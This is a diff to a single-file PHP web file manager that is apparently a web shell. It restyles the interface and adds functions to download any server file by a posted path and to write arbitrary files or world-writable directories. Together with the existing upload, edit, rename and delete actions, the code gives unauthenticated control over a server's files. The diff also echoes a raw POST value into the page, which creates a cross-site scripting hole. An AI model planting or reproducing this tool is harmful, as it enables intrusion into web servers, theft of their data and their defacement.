@@ -6,9 +6,8 @@ table {
 	font-family: 'Ubuntu', sans-serif;
     width: 70%;
     border-spacing:0;
-	-webkit-box-shadow: 0px 2px 16px 3px rgba(18,18,18,0.32);
-	-moz-box-shadow: 0px 2px 16px 3px rgba(18,18,18,0.32);
-	box-shadow: 0px 2px 16px 3px rgba(18,18,18,0.32);
+    border:15px solid #fff;
+	box-shadow: 0px 0px 0px 6px rgba(222,222,222,0.73);
     border-radius:7px;
     color: #808080;
 }
@@ -31,7 +30,7 @@ a {
 	color: #808080;
 }
 tbody {
-    max-height:600px;
+    max-height:529px;
     overflow-y: auto;
 }
 
@@ -40,7 +39,7 @@ thead {
     width: calc(100% - 17px);
 }
 
-tbody { border-top: 2px solid #e6e6e6; }
+tbody { border-top: 5px solid #e6e6e6; }
 
 tbody td {
     width: 5em;
@@ -49,7 +48,7 @@ tbody td {
 }
 tbody td.td {
 	padding:7px;
-	width:65.52%;
+	width:60.52%;
 }
 tbody td {
 	padding:7px;
@@ -66,31 +65,35 @@ textarea.edit {
 }
 textarea.edit {
 	color: #808080;
+	resize: none;
 	font-family: 'Ubuntu', sans-serif;
-	height:400px;
-	border: 2px solid #e6e6e6;
+	height:300px;
+	border: 5px solid #e6e6e6;
 	border-radius:7px;
 	outline:none;
 }
 input[type=submit].edit {
 	padding:7px;
-	border: 2px solid #e6e6e6;
+	font-family: 'Ubuntu', sans-serif;
+	border: 5px solid #e6e6e6;
 	border-radius:7px;
 	outline:none;
 	background: #fff;
 	color: #808080;
 }
 input[type=submit].rename {
-	padding:7px;
-	border: 2px solid #e6e6e6;
+	padding:8px;
+	border: 5px solid #e6e6e6;
 	border-radius:7px;
 	outline:none;
 	background: #fff;
+	font-family: 'Ubuntu', sans-serif;
 	color: #808080;
 }
 input[type=text].rename {
 	padding:7px;
-	border: 2px solid #e6e6e6;
+	font-family: 'Ubuntu', sans-serif;
+	border: 5px solid #e6e6e6;
 	border-radius:7px;
 	outline:none;
 	background: #fff;
@@ -99,16 +102,22 @@ input[type=text].rename {
 option {
 	outline:none;
 }
+input[type=text]:hover {
+	border:5px solid red;
+}
 select.action:hover,
 input[type=submit]:hover {
-	border:2px solid red;
+	border:5px solid red;
 	cursor:pointer;
 }
 select.action {
-	border: 2px solid #e6e6e6;
+	text-transform: uppercase;
+	font-family: 'Ubuntu', sans-serif;
+	border: 5px solid #e6e6e6;
 	color: #808080;
 	border-radius:7px;
 	padding:3px;
+	margin-right:-20px;
 	outline:none;
 	float:right;
 }
@@ -165,13 +174,54 @@ button:hover {
 	cursor:pointer;
 }
 .submit-upload {
-	margin-right:14px;
 	width:85px;
-	padding:1px;
+	padding:4px;
+	font-weight: normal;
 	border-radius:7px;
-	border: 2px solid #e6e6e6;
+	border: 5px solid #e6e6e6;
 	color: #808080;
 	background:#fff
+}
+.upload-btn-wrapper {
+	font-weight: normal;
+  	position: relative;
+  	overflow: hidden;
+  	display: inline-block;
+  	margin-top:12px;
+}
+.btn {
+  	color: #8a8a8a;
+  	border:5px solid rgba(222,222,222,0.73);
+  	padding: 6px 22px;
+  	border-radius: 7px;
+  	font-size: 15px;
+}
+.upload-btn-wrapper input[type=file] {
+  	font-size: 100px;
+  	position: absolute;
+  	left: 0;
+  	top: 0;
+  	opacity: 0;
+}
+tbody td.file {
+	width:5.5em;
+}
+tbody td.dir {
+	width:5.5em;
+}
+select.p {
+	content:;
+	color: #8a8a8a;
+	padding:1px;
+	font-family: 'Ubuntu', sans-serif;
+	text-transform: uppercase;
+	outline:none;
+	border:none;
+	background:none;
+}
+option:hover {
+	border:none;
+	outline:none;
 }
 @media screen and (max-width: 600px) {
 	body {
@@ -204,7 +254,7 @@ button:hover {
 		max-width:100%;
 	}
 	select.action {
-		border: 2px solid #e6e6e6;
+		border: 5px solid #e6e6e6;
 		color: #808080;
 		background: #fff;
 		border-radius:7px;
@@ -216,10 +266,10 @@ button:hover {
 		padding: 5px;
 	}
 	tbody td.file {
-		width:7em;
+		width:4.5em;
 	}
 	tbody td.dir {
-		width:7em;
+		width:4.5em;
 	}
 	tbody td {
 		padding:3px;
@@ -252,7 +302,7 @@ button:hover {
     <thead>
       <tr>
       	<form method="post">
-        <th style="float:left;margin:10px;" colspan="4">
+        <th style="float:left;margin:10px;margin-top:-5px;" colspan="4">
         	<button name="tools" value="home">HOME</button>&nbsp&nbsp&nbsp&nbsp
         	<button name="tools" value="upload">UPLOAD</button>
         </th>
@@ -334,6 +384,34 @@ function alert($msg, $type) {
 	<div class="alert punten <?=$type?>"><?= $msg ?></div>
 	<?php
 }
+function download($filename) {
+	if(ini_get('zlib.output_compression'))
+		ini_set('zlib.output_compression', 'Off');
+	$file_extension = strtolower(substr(strrchr($filename,"."),1));
+	switch( $file_extension ){
+		case "pdf": $ctype="application/pdf"; break;
+		case "exe": $ctype="application/octet-stream"; break;
+		case "zip": $ctype="application/zip"; break;
+  		case "doc": $ctype="application/msword"; break;
+  		case "xls": $ctype="application/vnd.ms-excel"; break;
+  		case "ppt": $ctype="application/vnd.ms-powerpoint"; break;
+  		case "gif": $ctype="image/gif"; break;
+  		case "png": $ctype="image/png"; break;
+  		case "jpeg":
+  		case "jpg": $ctype="image/jpg"; break;
+  		default: $ctype="application/force-download";
+  	}
+	@header("Pragma: public"); // required
+	@header("Expires: 0");
+	@header("Cache-Control: must-revalidate, post-check=0, pre-check=0");
+	@header("Cache-Control: private",false);
+	@header("Content-Type: $ctype");
+	@header("Content-Disposition: attachment; filename=\"".basename($filename)."\";" );
+	@header("Content-Transfer-Encoding: binary");
+	@header("Content-Length: ".filesize($filename));
+	readfile("$filename");
+	exit();
+}
 function size($file) {
     $bytes = filesize($file);
 
@@ -375,6 +453,15 @@ function delete($filename) {
     }
   }
 }
+function making($filename, $text, $type = null) {
+	if ($type === 'file') {
+		$handle = fopen($filename, "w");
+		fwrite($handle, $text);
+		fclose($handle);
+	} elseif ($type === 'dir') {
+		return (!empty($filename) || is_file($filename) || mkdir(cwd().DIRECTORY_SEPARATOR.$filename, 0777));
+	}
+}
 switch (@$_POST['tools']) {
 	case 'home':
 		?>
@@ -386,9 +473,12 @@ switch (@$_POST['tools']) {
 			<form method="post" enctype="multipart/form-data">
 				<tr>
 					<td class="action">
-						<input type="file" name="file[]" multiple>
+						<div class="upload-btn-wrapper">
+							<button class="btn">Choose file</button>
+							<input type="file" name="file[]" multiple>
+						</div>
 						<input class="submit-upload right" type="submit" name="submit" value="UPLOAD">
-						<input type="hidden" name="tools" value="upload">
+						<input style="margin: 10px;" type="hidden" name="tools" value="upload">
 					</td>
 				</tr>
 			</form>
@@ -415,7 +505,25 @@ switch (@$_POST['tools']) {
 					}
 				}
 			}
+			exit();
 		break;
+		case 'making': ?>
+			<form method="post">
+				<tr>
+					<td>
+						<input type="text" name="">
+					</td>
+				</tr>
+			</form>
+			<?php
+			if (isset($_POST['submit'])) {
+				if ($_POST['type'] == 'file') {
+					making($_POST['filename'], $_POST['text'], 'file');
+				} elseif ($_POST['type'] == 'dir') {
+					making($_POST['filename'], "", "dir");
+				}
+			}
+			break;
 }
 switch (@$_POST['action']) {
 	case 'edit':
@@ -524,7 +632,7 @@ switch (@$_POST['action']) {
 					<form method="post">
 					<tr>
 						<td class="action">
-							<input class="rename" type="text" name="newname" value="<?= basename($_POST['file']) ?>">
+							<input class="rename" type="text" name="newname" value="<?= $_POST['file'] ?>">
 						</td>
 					</tr>
 					<tr>
@@ -567,7 +675,7 @@ switch (@$_POST['action']) {
 					<form method="post">
 					<tr>
 						<td class="action">
-							<input class="rename" type="text" name="newname" value="<?= basename($_POST['file']) ?>">
+							<input class="rename" type="text" name="newname" value="<?= $_POST['file'] ?>">
 						</td>
 					</tr>
 					<tr>
@@ -587,6 +695,9 @@ switch (@$_POST['action']) {
 	case 'back':
 		@header("Location: ?dir=".cwd()."");
 		break;
+	case 'download':
+		download($_POST['file']);
+		break;
 }
 if(function_exists('opendir')) {
 	if($opendir = opendir(cwd())) {
@@ -601,16 +712,16 @@ foreach ($getpath as $dir) {
 	if (!is_dir($dir) || $dir === '.') continue;
 		if ($dir === '..') {
 			$back = "<input type='checkbox' onchange='checkAll(this)'>&nbsp&nbsp<a href='?dir=".dirname(cwd())."'>
-					 <img class='icon' src='https://image.flaticon.com/icons/svg/833/833385.svg' title='back'>
+					 <img class='icon' src='https://image.flaticon.com/icons/svg/271/271218.svg' title='back'>
 					 </a>";
 		} else {
-			$back = "<input name='data[]' value='{$dir}' type='checkbox'>&nbsp&nbsp<img src='https://image.flaticon.com/icons/svg/716/716784.svg' class='icon' title='{$dir}'>&nbsp&nbsp<a href='?dir=".cwd().'/'.$dir."'>{$dir}</a>";
+			$back = "<input form='data' name='data[]' value='{$dir}' type='checkbox'>&nbsp&nbsp<img src='https://image.flaticon.com/icons/svg/716/716784.svg' class='icon' title='{$dir}'>&nbsp&nbsp<a href='?dir=".cwd().'/'.$dir."'>{$dir}</a>";
 		} if ($dir === '.' || $dir === '..') {
 			$action = "<td class='dir'></td>";
 		} else {
 			$action = '<form method="post">
 							<td class="dir">
-								<select class="action" style="float:right;" name="action" onchange="if(this.value != 0) { this.form.submit(); }"">
+								<select class="p" style="float:right;" name="action" onchange="if(this.value != 0) { this.form.submit(); }"">
 									<option selected>choose . .</option>
 									<option value="delete">delete</option>
 									<option value="rename">rename</option>
@@ -626,11 +737,9 @@ foreach ($getpath as $dir) {
 			</td>
 			<td class="screen"><center>--</center></td>
 			<td class="files">
-				<center>
-					<span style="font-size:15px;float:right;">
+					<span style="font-size:14px;float:left;">
 						<?= permission($dir, perms($dir)) ?>
 					</span>	
-				</center>
 			</td>
 			<form method="post">
 			<?= $action ?>
@@ -642,7 +751,7 @@ foreach ($getpath as $file) {
 		?>
 		<tr class="hover">
 			<td class="td">
-				<input type='checkbox' name='data[]' value="<?=$file?>">
+				<input type='checkbox' form="data" name='data[]' value="<?=$file?>">
 				<?php
 				print("<img class='icon' src='");
 				$ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
@@ -729,15 +838,13 @@ foreach ($getpath as $file) {
 			</td>
 			<div>
 			<td class="files">
-				<center>
-					<span style="font-size:15px;">
+					<span style="font-size:14px;">
 						<?= permission($file, perms($file)) ?>
 					</span>
-				</center>
 			</td>
 			<form method="post">
 			<td class="file">
-				<select class="action" style="float:right;" name="action" onchange='if(this.value != 0) { this.form.submit(); }'>
+				<select class="p" style="float:right;" name="action" onchange='if(this.value != 0) { this.form.submit(); }'>
 					<option selected>choose . .</option>
 					<option value="edit">Edit</option>
 					<option value="delete">delete</option>
@@ -752,23 +859,46 @@ foreach ($getpath as $file) {
 }
 ?>
 <tr>
-	<form method="post">
-	<td class="action">
-		<select name="mode" class="action" style="float:left;width:50%;" onchange='if(this.value != 0) { this.form.submit(); }'>
-			<option selected>choose . .</option>
-			<option value="delete">delete</option>
-		</select>
-	</td>
-</form>
+	<thead>
+		<form method="post" id="data">
+			<th class="action">
+				<select name="mode" class="action" style="float:left;width:50%;margin:10px;" onchange='if(this.value != 0) { this.form.submit(); }'>
+					<option selected>choose . .</option>
+					<option value="delete">delete</option>
+				</select>
+			</th>
+		</form>
+	</thead>
 </tr>
 <?php
-$data = $_POST['data'];
-switch ($_POST['mode']) {
-	case 'delete':
-		foreach ($data as $key => $value) {
-			delete($value);
+if (!empty(@$data = $_POST['data'])) {
+	foreach ($data as $value) {
+		switch ($_POST['mode']) {
+			case 'delete':
+				if (delete($value)) {
+					?>
+					<tr>
+						<td class="action">
+							<?= alert("{$value} Deleted !", "success") ?>
+						</td>
+					</tr>
+					<?php
+				} else {
+					?>
+					<tr>
+						<td class="action">
+							<?= alert("{$value} Failed !", "failed") ?>
+						</td>
+					</tr>
+					<?php
+				}
+				break;
+			
+			default:
+				# code...
+				break;
 		}
-		break;
+	}
 }
 ?>
 <script type="text/javascript">
